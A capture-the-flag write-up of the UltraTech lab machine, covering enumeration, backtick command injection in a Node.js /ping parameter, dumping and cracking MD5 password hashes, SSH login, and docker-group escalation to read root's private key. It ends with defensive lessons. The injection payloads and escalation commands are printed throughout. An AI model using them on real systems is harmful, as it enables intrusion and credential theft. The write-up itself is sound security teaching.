# UltraTech — Write-Up

**Platform:** HackTheBox  
**Difficulty:** Medium  
**Author:** Obada (XENOS)  
**Tags:** `Command Injection` `SQLite` `Hash Cracking` `Docker Privilege Escalation`

---

## Summary

UltraTech is a medium-difficulty Linux machine that chains multiple vulnerabilities together:
a **Command Injection** on a Node.js API endpoint leaks SQLite database credentials,
which are then cracked to gain SSH access. Privilege escalation abuses membership in the
**docker group** to mount the host filesystem inside a container and read root's private SSH key.

---

## Enumeration

### Nmap

```bash
sudo nmap -sCV -O -T4 -A -Pn -p- 10.129.134.33 -oN nmap-result.nmap
```

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Two HTTP services running on different ports — this is the first thing to investigate.

---

### Gobuster — Port 8081 (Node.js API)

```bash
gobuster dir -u http://10.129.134.33:8081 \
  -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt
```

```
/auth   (Status: 200) [Size: 39]
/ping   (Status: 500) [Size: 1094]
```

Visiting `/auth` returns:
```
You must specify a login and a password
```

The `/ping` endpoint looks interesting — a 500 error usually means it needs a parameter.

---

### Gobuster — Port 31331 (Apache)

```bash
gobuster dir -u http://10.129.134.33:31331 \
  -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt
```

```
/css            (Status: 301)
/images         (Status: 301)
/index.html     (Status: 200)
/javascript     (Status: 301)
/js             (Status: 301)
/robots.txt     (Status: 200)
/server-status  (Status: 403)
```

Checking `/robots.txt`:
```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

Checking `/utech_sitemap.txt`:
```
/
/index.html
/what.html
/partners.html
```

`/partners.html` contains a login page — but no obvious credentials yet.

---

## Command Injection

### Confirming the Vulnerability

The `/ping` endpoint on port 8081 accepts an `ip` parameter and executes a system `ping` command.
The backend logic looks something like:

```javascript
exec(`ping -c 1 ${req.query.ip}`)
```

Since the input is passed directly to the shell with no sanitization, it's vulnerable to **Command Injection**.

First, confirm the endpoint works normally:

```
http://10.129.134.33:8081/ping?ip=127.0.0.1
```

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.089 ms
```

Now test injection using **backtick syntax** — in Linux/Bash, `` `command` `` executes a sub-command
and substitutes its output inline. The server will try to `ping` the output of `ls` as a hostname,
which reveals filenames in the error message:

```
http://10.129.134.33:8081/ping?ip=127.0.0.1`ls`
```

```
ping: utech.db.sqlite: Name or service not known
```

The `ls` output (`utech.db.sqlite`) was passed to `ping` as a hostname — injection confirmed,
and we found a database file.

---

### Dumping the Database

Use `cat` to read the SQLite file. Even though the file is binary,
readable strings (like credentials) will appear in the error output:

```
http://10.129.134.33:8081/ping?ip=127.0.0.1`cat%20utech.db.sqlite`
```

```
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Name or service not known
```

Two users and their password hashes extracted:

| User   | Hash                             |
|--------|----------------------------------|
| r00t   | f357a0c52799563c7c7b76c1e7543a32 |
| Madmin | 0d0ea5111e3c1def594c1684e3b9be84 |

---

## Hash Cracking

Both hashes are **MD5** (32 hex characters). MD5 is a one-way hash function,
but weak passwords can be cracked by matching hashes against a wordlist.

Using [CrackStation](https://crackstation.net):

| User   | Hash                             | Password  |
|--------|----------------------------------|-----------|
| r00t   | f357a0c52799563c7c7b76c1e7543a32 | n100906   |
| Madmin | 0d0ea5111e3c1def594c1684e3b9be84 | mrsheafy  |

Alternatively, crack locally with Hashcat:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Initial Access — SSH

```bash
ssh r00t@10.129.134.33
# password: n100906
```

We have a shell as user `r00t`.

---

## Privilege Escalation — Docker Group Abuse

### Identifying the Vector

```bash
id
```

```
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

The user is a member of the **docker group**. This is a well-known privilege escalation vector:
members of the docker group can run containers as root, and if they mount the host filesystem
inside a container, they get full read/write access to every file on the host — including root's files.

### Exploitation

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

Breaking down the command:

| Part | What it does |
|------|--------------|
| `docker run` | Start a new container |
| `-v /:/mnt` | Mount the host root filesystem (`/`) into the container at `/mnt` |
| `--rm` | Remove the container after exit |
| `-it` | Open an interactive terminal |
| `bash` | Use the official bash Docker image |
| `chroot /mnt` | Change root directory to `/mnt` — now `/` inside the shell is the host filesystem |
| `sh` | Launch a shell in the new root |

```bash
whoami
```

```
root
```

We are now root — but on the host filesystem, not just inside a container.

---

## Reading Root's Private SSH Key

```bash
cat /root/.ssh/id_rsa
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAJBAMDdnxFgEBB...
```

**First 9 characters of the key:** `MIIEogIBAAJBAMDd`

> The private key can be used to authenticate directly as root:
> `ssh -i id_rsa root@10.129.134.33`

---

## Vulnerability Summary

| Step | Vulnerability | Impact |
|------|--------------|--------|
| Command Injection | Unsanitized shell input in `/ping` | Remote code execution as web server |
| Credential Leak | SQLite DB readable via injection | Cleartext credentials (hashed) |
| Weak Passwords | MD5 hashes cracked in seconds | SSH access |
| Docker Misconfiguration | User in docker group | Full host filesystem access as root |

---

## Key Takeaways

- **Never pass user input directly to shell commands.** Use parameterized exec functions (e.g., `execFile` in Node.js) instead of `exec` with string interpolation.
- **Never store passwords as MD5.** Use bcrypt, argon2, or scrypt with a salt.
- **The docker group is equivalent to root.** Treat membership in this group as a critical misconfiguration.
- **Backtick injection** is a clean way to extract blind command injection output via error messages when direct output is not returned.

---

*Write-up by Obada — [github.com/obadahamed](https://github.com/obadahamed)*
